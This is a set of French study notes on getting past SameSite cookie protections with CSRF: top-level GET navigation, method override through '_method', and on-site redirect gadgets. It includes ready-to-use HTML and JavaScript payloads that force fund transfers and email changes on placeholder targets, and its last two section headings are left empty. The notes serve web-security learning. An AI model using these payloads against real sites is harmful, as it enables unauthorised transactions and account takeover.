> Contourner les restrictions de cookies SameSite

# Bypassing SameSite Lax restrictions using GET requests

(Contournement des restrictions SameSite Lax à l'aide de requêtes GET | Contournement de SameSite Lax via la substitution de méthode)

Si un site  appliquent des restrictions `Lax` à leurs **cookies de session**, explicitement ou par défaut, vous pouvez toujours lancer une attaque CSRF en sollicitant **une `GET`requête du navigateur de la victime.**

> Tant que la requête `implique une navigation de premier niveau`, le navigateur inclura le cookie de session de la victime.

Voici l'une des approches les plus simples pour lancer une telle attaque :

```html
<script>
    document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';
</script>
```

Même si une requête ordinaire `GET` n'est pas autorisée, certains frameworks permettent de surcharger la méthode spécifiée dans la ligne de requête. 

Par exemple, Symfony prend en charge le paramètre `_method` dans les formulaires, qui prime sur la méthode normale pour le routage :

```html
<form action="https://vulnerable-website.com/account/transfer-payment" method="POST">
    <input type="hidden" name="_method" value="GET">
    <input type="hidden" name="recipient" value="hacker">
    <input type="hidden" name="amount" value="1000000">
</form>
```

Exploitation par GET

```html
<script>
document.location = "https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000&_method=POST"
</script>
```


> Un site qui protège ses cookies avec `SameSite=Lax` n’empêche **pas** les requêtes issues d’une **navigation de premier niveau** (clics, redirections, `window.location`, formulaires) : dans ces cas le navigateur envoie le cookie de session. Si le serveur exécute des actions sensibles en réponse à une **requête GET** (ou accepte qu’on remplace la méthode via un paramètre comme `_method`), un attaquant peut forcer la victime à naviguer vers une URL malveillante et déclencher cette action à sa place (attaque CSRF).


## Bypassing SameSite restrictions using on-site gadgets

(Contourner les restrictions SameSite à l'aide de gadgets sur site | Contournement strict de SameSite via la redirection côté client)

Si un cookie a l’attribut `SameSite=Strict`, le navigateur ne l’enverra pas quand une page d’un autre site fait une requête.  

Mais on peut contourner ça si le **site lui‑même** contient un petit code (un « gadget ») qui crée ensuite une **nouvelle** requête vers ce même site. (les commentaire, url de redirection etc...)

Par exemple, `le gadget peut prendre un paramètre d’URL (contrôlable par un attaquant)` et `faire une redirection côté client vers une autre page du même site`. Pour le navigateur, cette redirection est juste une nouvelle requête normale vers le **même domaine**, donc tous les cookies du site (même avec `SameSite=Strict`) sont envoyés.

Si un attaquant peut contrôler ce gadget pour forcer une telle requête interne, il peut contourner totalement la protection `SameSite`.

```html
<script>
    document.location = "https://target.com/post/comment/confirmation?postId=../../my-account/change-email?email=pwned@web-security-academy.net&submit=1";
</script>
```

## Bypassing SameSite restrictions via vulnerable sibling domains


## Bypassing SameSite Lax restrictions with newly issued cookies

